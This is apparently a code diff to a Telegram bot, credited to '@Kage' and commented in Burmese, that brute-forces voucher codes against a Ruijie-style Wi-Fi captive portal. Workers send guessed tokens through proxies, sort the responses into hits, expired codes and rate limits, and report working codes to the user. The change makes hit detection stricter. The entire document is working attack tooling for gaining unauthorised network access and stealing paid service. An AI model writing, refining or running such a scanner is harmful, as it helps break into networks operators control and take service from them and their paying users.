@@ -205,24 +205,26 @@ async def worker_task(worker_id, session, portal_url, chat_id):
             if "?" not in clean_portal:
                 clean_portal += "?"
             
-            # Ruijie ဆာဗာအတွက် token နဲ့ code နှစ်မျိုးစလုံးကို ပုံစံစုံ ပို့ပေးခြင်း
-            target_url = f"{clean_portal}&token={code_val}&code={code_val}"
+            target_url = f"{clean_portal}&token={code_val}"
             async with session.get(target_url, proxy=proxy, timeout=3.0) as response:
                 html_content = await response.text()
                 lower_html = html_content.lower()
                 
-                success_keywords = ["success", "welcome", "connected", "auth_pass", "login successfully", "internet", "minutes", "hours", "remaining", "authenticated", "balance", "ok"]
-                expired_keywords = ["expired", "invalid", "timeout", "used", "incorrect", "wrong"]
-                limit_keywords = ["limit", "already logged", "in use", "too many", "blocked", "restricted", "exceeded"]
+                # တကယ့် ကုဒ်အမှန်ဖြစ်မှသာ လက်ခံရန် တင်းကျပ်သော စစ်ဆေးချက်များ (Strict Validation)
+                is_real_hit = (
+                    response.status == 200 and
+                    any(k in lower_html for k in ["success", "authenticated", "auth_pass", "login successfully"]) and
+                    not any(e in lower_html for e in ["error", "fail", "invalid", "expired", "wrong", "incorrect", "portal", "login"])
+                )
                 
-                if response.status == 200 and any(kw in lower_html for kw in success_keywords) and "error" not in lower_html and "fail" not in lower_html:
+                if is_real_hit:
                     if chat_id not in found_codes:
                         found_codes[chat_id] = []
                     if code_val not in found_codes[chat_id]:
                         found_codes[chat_id].append(code_val)
-                elif any(kw in lower_html for kw in expired_keywords):
+                elif any(kw in lower_html for kw in ["expired", "invalid", "timeout", "used", "incorrect", "wrong"]):
                     expired_counters[chat_id] = expired_counters.get(chat_id, 0) + 1
-                elif any(kw in lower_html for kw in limit_keywords):
+                elif any(kw in lower_html for kw in ["limit", "already logged", "in use", "too many", "blocked"]):
                     limits_counters[chat_id] = limits_counters.get(chat_id, 0) + 1
         except Exception:
             pass
@@ -255,19 +257,19 @@ async def run_scanner_with_workers(query, context, portal_url):
             speed = (tried / elapsed * 60) if elapsed > 0 else 0.0
             hits_list = found_codes.get(chat_id, [])
             
-            hits_str = "\n".join([f"🔥 {code} | 3hr | 0 hr 0 min" for code in hits_list[-5:]]) if hits_list else "None yet"
+            hits_str = "\n".join([f"🔥 {code} | Valid" for code in hits_list[-5:]]) if hits_list else "None yet"
             
             live_text = (
                 "⚡ Scanner Running ⚡\n"
                 "Thank for using By Telegram @Kage\n\n"
                 f"🏹 Tried: {tried:,}\n"
                 f"🎯 Current Code: {current_codes_tracker.get(chat_id, '000000')}\n"
-                f"🔥 Hits: {len(hits_list)} BY @Kage ကုဒ်စစ်\n"
-                f"❌ Kage Expired: {expired}\n"
-                f"⚠️ Kage Limits: {limits}\n"
+                f"🔥 Real Hits: {len(hits_list)} BY @Kage ကုဒ်စစ်\n"
+                f"❌ Expired: {expired}\n"
+                f"⚠️ Limits: {limits}\n"
                 f"⚡ Speed: {speed:,.1f} c/m\n"
                 "___________________\n"
-                f"🔥 Hit Codes By Kage:\n{hits_str}"
+                f"🔥 Verified Hit Codes:\n{hits_str}"
             )
             try:
                 await status_message.edit_text(live_text, reply_markup=stop_keyboard)
@@ -279,9 +281,9 @@ async def run_scanner_with_workers(query, context, portal_url):
     final_hits = found_codes.get(chat_id, [])
     final_text = f"🛑 ပြီးဆုံးပါပြီ။\n\n"
     if final_hits:
-        final_text += "🔥 Hit Codes Found:\n" + "\n".join(final_hits)
+        final_text += "🔥 Verified Hit Codes Found:\n" + "\n".join(final_hits)
     else:
-        final_text += "ℹ️️ တွေ့ရှိသော Code အသစ် မရှိသေးပါ။"
+        final_text += "ℹ️ စစ်မှန်သော Code အစစ်အမှန် မတွေ့ရှိသေးပါ။"
     await query.message.reply_text(final_text)
 
 def main():
@@ -298,3 +300,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+        
